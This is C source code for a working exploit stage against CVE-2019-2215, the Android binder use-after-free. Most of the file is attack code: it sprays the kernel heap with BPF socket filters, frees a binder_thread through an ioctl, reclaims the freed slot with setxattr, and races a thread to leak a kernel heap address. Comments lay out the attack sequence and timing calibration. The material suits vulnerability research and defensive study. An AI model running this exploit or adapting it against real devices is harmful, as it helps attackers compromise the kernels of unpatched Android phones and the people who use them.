/*
 * cve_2019_2215_xattr3.c — CVE-2019-2215 heap leak via xattr race (v3)
 *
 * FIX from v1/v2: file creation + thread creation MUST happen BEFORE
 * BINDER_THREAD_EXIT. Otherwise, dentry allocation from open() steals
 * the freed binder_thread slot in kmalloc-256.
 *
 * Correct sequence:
 * 1. BPF spray (fill kmalloc-256)
 * 2. Create xattr file (dentry alloc here, BEFORE UAF)
 * 3. Create closer thread (spinning)
 * 4. Open binder, enter looper, add to epoll
 * 5. BINDER_THREAD_EXIT → FREE binder_thread
 * 6. IMMEDIATELY: setxattr → kmalloc → reclaims the freed slot
 * 7. Closer thread fires during setxattr → corrupts buffer
 * 8. ext4 copies corrupted buffer to filesystem
 * 9. getxattr reads back kernel heap address
 *
 * Build: .\qemu\build-arm.bat src\cve_2019_2215_xattr3.c cve_2019_2215_xattr3
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)
#define BC_ENTER_LOOPER         0x630c

struct binder_write_read {
    signed long write_size, write_consumed;
    unsigned long write_buffer;
    signed long read_size, read_consumed;
    unsigned long read_buffer;
};

#define XATTR_NAME "user.leak"

/* Shared race state */
static volatile int race_go = 0;
static int race_epfd = -1;
static int race_delay_iters = 0;  /* busy-wait iterations */

static void *closer_thread(void *arg) {
    /* Pin to CPU 1 */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    int ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    CPU_SET(ncpu > 1 ? 1 : 0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* Tight spin — no yield, no sleep */
    while (!race_go);

    /* Calibrated delay to hit the setxattr race window */
    for (volatile int i = 0; i < race_delay_iters; i++);

    close(race_epfd);
    return NULL;
}

static int attempt_one(int attempt, const char *path, char *val, int val_size) {
    int ncpu = sysconf(_SC_NPROCESSORS_ONLN);

    /* Pin main thread to CPU 0 */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* === STEP 1: BPF spray to fill kmalloc-256 === */
    int spray_socks[200];
    struct sock_filter insns[26];
    for (int j = 0; j < 25; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0;
    }
    insns[25].code = BPF_RET | BPF_K;
    insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF;
    struct sock_fprog prog = { .len = 26, .filter = insns };

    for (int j = 0; j < 200; j++) {
        spray_socks[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray_socks[j] >= 0)
            setsockopt(spray_socks[j], SOL_SOCKET, SO_ATTACH_FILTER,
                       &prog, sizeof(prog));
    }

    /* === STEP 2: Warm the path (dentry cached) === */
    /* File already created by caller. Do a path lookup to ensure
     * the dentry is in the dcache. */
    struct stat st;
    stat(path, &st);

    /* === STEP 3: Create closer thread BEFORE UAF === */
    race_go = 0;
    /* Delay: sweep 500-30000 iterations (~2.5-150μs at ~5ns/iter)
     * setxattr takes ~52μs. Window is ~3-45μs from setxattr start.
     * Add ~1μs for race_go→setxattr overhead. So closer needs 4-46μs. */
    race_delay_iters = 500 + (attempt * 97) % 9000;

    pthread_t tclose;
    pthread_create(&tclose, NULL, closer_thread, NULL);

    /* Let the closer thread fully start and reach the spin loop */
    usleep(1000);

    /* === STEP 4: Open binder, add to epoll (NO BC_ENTER_LOOPER!) ===
     *
     * CRITICAL: Do NOT call BC_ENTER_LOOPER. Without ENTERED flag:
     *   binder_poll → wait_for_proc_work=FALSE → poll_wait on thread->wait
     * With ENTERED flag:
     *   binder_poll → wait_for_proc_work=TRUE → poll_wait on proc->wait (SAFE)
     *
     * We need the epoll entry on thread->wait so BINDER_THREAD_EXIT
     * frees the wait queue head = UAF when close(epfd) calls remove_wait_queue.
     */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) goto cleanup;

    uint32_t mx = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &mx);

    /* epoll_ctl ADD → calls binder_poll → creates binder_thread
     * with looper=NEED_RETURN → poll_wait on thread->wait */
    race_epfd = epoll_create1(O_CLOEXEC);
    if (race_epfd < 0) { close(binder_fd); goto cleanup; }

    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(race_epfd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        close(race_epfd); close(binder_fd); goto cleanup;
    }

    /* === STEP 5: FREE binder_thread (UAF) ===
     * Thread created by binder_poll in epoll_ctl above.
     * After kfree, the epoll entry still points to thread->wait.
     * Slot goes to CPU 0's per-CPU freelist (LIFO). */
    int thr = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, &thr);

    /* === STEP 6: IMMEDIATELY setxattr === 
     * race_go=1 signals the closer thread to start its delay.
     * setxattr's kmalloc should reclaim the freed slot. */
    race_go = 1;
    int ret = setxattr(path, XATTR_NAME, val, val_size, XATTR_CREATE);

    /* Wait for closer thread */
    pthread_join(tclose, NULL);

    /* === STEP 7: Read back xattr and check for corruption === */
    int leaked = 0;
    char *rbuf = NULL;

    if (ret == 0) {
        rbuf = malloc(val_size);
        memset(rbuf, 0, val_size);
        ssize_t rlen = getxattr(path, XATTR_NAME, rbuf, val_size);

        if (rlen >= 56) {
            uint32_t v48 = *(uint32_t*)(rbuf + 48);
            uint32_t v52 = *(uint32_t*)(rbuf + 52);

            if (v48 != *(uint32_t*)(val + 48) || v52 != *(uint32_t*)(val + 52)) {
                printf("  [%d] CORRUPTION! +48=0x%08x +52=0x%08x (delay=%d iters)\n",
                       attempt, v48, v52, race_delay_iters);
                if (v48 >= 0xC0000000 && v48 < 0xF0000000) {
                    printf("  ✓ KERNEL HEAP LEAK: 0x%08x (base≈0x%08x)\n",
                           v48, v48 - 48);
                    leaked = 1;
                }
            }
        }
        removexattr(path, XATTR_NAME);
    } else {
        /* setxattr failed — remove and retry */
        removexattr(path, XATTR_NAME);
    }

    close(binder_fd);
    if (rbuf) free(rbuf);

cleanup:
    race_go = 1;  /* unstick closer if it didn't fire */
    for (int j = 0; j < 200; j++)
        if (spray_socks[j] >= 0) close(spray_socks[j]);
    return leaked;
}

int main(int argc, char **argv) {
    int max_attempts = 2000;
    if (argc > 1) max_attempts = atoi(argv[1]);

    printf("=== CVE-2019-2215 Heap Leak v3 (xattr race, fixed ordering) ===\n");
    printf("Attempts: %d, PID=%d, UID=%d, CPUs=%ld\n\n",
           max_attempts, getpid(), getuid(), sysconf(_SC_NPROCESSORS_ONLN));

    /* Pre-create the xattr file (ONCE, before any UAF) */
    const char *path = "/data/local/tmp/.xattr_leak3";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { char c = 'x'; write(fd, &c, 1); close(fd); }

    /* Verify setxattr works */
    char test[200];
    memset(test, 'T', sizeof(test));
    if (setxattr(path, XATTR_NAME, test, sizeof(test), XATTR_CREATE) < 0) {
        printf("setxattr failed: %s\n", strerror(errno));
        return 1;
    }
    removexattr(path, XATTR_NAME);
    printf("setxattr works, payload size 200\n\n");

    /* Prepare xattr value with markers */
    char val[200];
    memset(val, 'Q', sizeof(val));
    memset(val + 44, 0, 4);              /* spinlock = 0 at offset 44 */
    *(uint32_t*)(val + 48) = 0xDEADBEEF; /* marker at offset 48 */
    *(uint32_t*)(val + 52) = 0xCAFEBABE; /* marker at offset 52 */

    int leaked = 0;
    int crashes = 0, timeouts = 0;

    for (int a = 0; a < max_attempts; a++) {
        if (a % 200 == 0) {
            printf("  [%d/%d] crashes=%d timeouts=%d...\n",
                   a, max_attempts, crashes, timeouts);
            fflush(stdout);
        }

        pid_t pid = fork();
        if (pid == 0) {
            alarm(4);
            signal(SIGSEGV, SIG_DFL);
            int r = attempt_one(a, path, val, sizeof(val));
            _exit(r > 0 ? 42 : 0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            if (WEXITSTATUS(status) == 42) {
                printf("\n  ✓ HEAP LEAK at attempt %d!\n", a);
                leaked = 1;
                break;
            }
        } else if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            if (sig == SIGALRM) timeouts++;
            else {
                printf("  [%d] signal %d\n", a, sig);
                crashes++;
            }
        }

        /* Recreate the file if xattr state is dirty */
        removexattr(path, XATTR_NAME);
    }

    if (!leaked) {
        printf("\n  No leak in %d attempts (crashes=%d, timeouts=%d)\n",
               max_attempts, crashes, timeouts);
    }

    unlink(path);
    printf("\n=== Done ===\n");
    return leaked ? 0 : 1;
}
